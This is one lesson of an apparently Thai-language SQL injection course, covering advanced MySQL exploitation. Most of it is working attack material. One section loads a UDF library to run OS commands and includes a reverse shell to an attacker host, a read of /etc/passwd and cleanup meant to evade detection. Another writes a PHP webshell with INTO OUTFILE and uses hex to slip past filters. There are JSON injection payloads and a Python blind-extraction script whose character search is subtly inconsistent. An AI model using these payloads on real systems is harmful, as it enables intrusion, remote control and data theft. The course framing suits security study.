# Part 098: Advanced MySQL Exploitation

## ภาพรวม

เทคนิคขั้นสูงสำหรับ MySQL: UDF, JSON functions, และ outfile techniques

**ขั้นตอนที่ 1541-1555**

---

## 1541. MySQL User-Defined Functions (UDF)

```sql
-- UDF ช่วยให้ run OS commands ผ่าน MySQL
-- ต้อง: FILE privilege + INSERT on mysql.func

-- Step 1: หา plugin directory
SHOW VARIABLES LIKE 'plugin_dir';
-- ตัวอย่าง: /usr/lib/mysql/plugin/

-- Step 2: ไลน์ UDF library (ต้องเป็น .so สำหรับ Linux, .dll Windows)
-- จาก sqlmap: --os-shell หรือใช้ pre-compiled lib
SELECT unhex('7f454c46...') INTO DUMPFILE '/usr/lib/mysql/plugin/udf.so';

-- Step 3: สร้าง function
CREATE FUNCTION sys_exec RETURNS INT SONAME 'udf.so';
CREATE FUNCTION sys_eval RETURNS STRING SONAME 'udf.so';

-- Step 4: Execute
SELECT sys_exec('id');
SELECT sys_eval('cat /etc/passwd');
SELECT sys_exec('bash -c "bash -i >& /dev/tcp/attacker/4444 0>&1" &');

-- Cleanup (ลบ เพื่อไม่ให้ detect):
DROP FUNCTION IF EXISTS sys_exec;
DROP FUNCTION IF EXISTS sys_eval;
DELETE FROM mysql.func WHERE name IN ('sys_exec', 'sys_eval');
```

---

## 1542. MySQL JSON Injection

```sql
-- MySQL 5.7+ มี JSON functions
-- ใช้สำหรับดึงข้อมูลจาก JSON columns:

CREATE TABLE products (
    id INT,
    details JSON
);

INSERT INTO products VALUES (1, '{"name": "Widget", "price": 9.99}');

-- ถ้าค้นหาด้วย JSON path แบบ dynamic:
-- SELECT * FROM products WHERE details->>'$.name' = '$input'
-- Injection: $input = "Widget' OR JSON_OVERLAPS(details, '[1]')-- -"

-- JSON_EXTRACT injection:
-- vulnerable code: "WHERE JSON_EXTRACT(data, '$." + key + "') = '" + val + "'"
-- key = "name') = 'x' OR 1=1-- -"

-- เทคนิคดึงข้อมูลผ่าน JSON:
SELECT JSON_EXTRACT(details, '$.price') FROM products;
SELECT details->>'$.name' FROM products WHERE id = 1;

-- สร้าง JSON payload:
' UNION SELECT JSON_OBJECT('u', user(), 'v', version()),NULL-- -
```

---

## 1543. MySQL INTO OUTFILE Techniques

```sql
-- เขียน webshell:
SELECT '<?php system($_GET["cmd"]); ?>' 
INTO OUTFILE '/var/www/html/shell.php';

-- เขียนไปยัง specific ตำแหน่ง:
SELECT version(), user(), database()
INTO OUTFILE '/tmp/mysql_info.txt';

-- หลีก character filter ด้วย hex:
SELECT 0x3c3f706870 ... INTO OUTFILE '/var/www/html/s.php';
-- 0x3c3f706870 = <?php

-- DUMPFILE (ไม่ใส่ newline):
SELECT UNHEX('hex_of_binary') INTO DUMPFILE '/usr/lib/mysql/plugin/udf.so';

-- ตรวจสอบนิฮสิทธิ์ก่อน:
SELECT ... INTO OUTFILE '/path/test' -- ถ้าเขียนได้ = FILE privilege + writable dir
```

---

## 1544. MySQL Blind Boolean Advanced

```python
import string
import requests

def mysql_extract_advanced(url: str, param: str, query: str) -> str:
    """
    ดึง string จาก MySQL ด้วย binary search + REGEXP
    """
    result = ''
    
    # หาความยาว
    for length in range(1, 200):
        payload = f"' AND LENGTH(({query}))={length}-- -"
        r = requests.get(url, params={param: payload + 'normal'}, timeout=5)
        normal = requests.get(url, params={param: 'normal'}, timeout=5)
        
        if len(r.text) != len(normal.text):
            actual_len = length
            break
    else:
        return ''
    
    # ดึงทีละ char ด้วย binary search
    charset = string.printable
    
    for pos in range(1, actual_len + 1):
        lo, hi = 0, len(charset) - 1
        while lo <= hi:
            mid = (lo + hi) // 2
            char = charset[mid]
            ascii_val = ord(char)
            
            payload = f"' AND ASCII(SUBSTRING(({query}),{pos},1))<={ascii_val}-- -"
            r = requests.get(url, params={param: 'normal' + payload}, timeout=5)
            normal = requests.get(url, params={param: 'normal'}, timeout=5)
            
            if len(r.text) != len(normal.text):  # condition is TRUE
                hi = mid - 1
            else:
                lo = mid + 1
        
        result += charset[lo] if lo < len(charset) else '?'
    
    return result
```

---

## สรุป

Advanced MySQL:
- **UDF** - upload .so → OS command execution
- **JSON functions** - inject via JSON path
- **INTO OUTFILE** - webshell + file write
- **Blind binary search** - efficient extraction

---

*Part 098 | SQL Injection Course | สำหรับการศึกษาเท่านั้น*
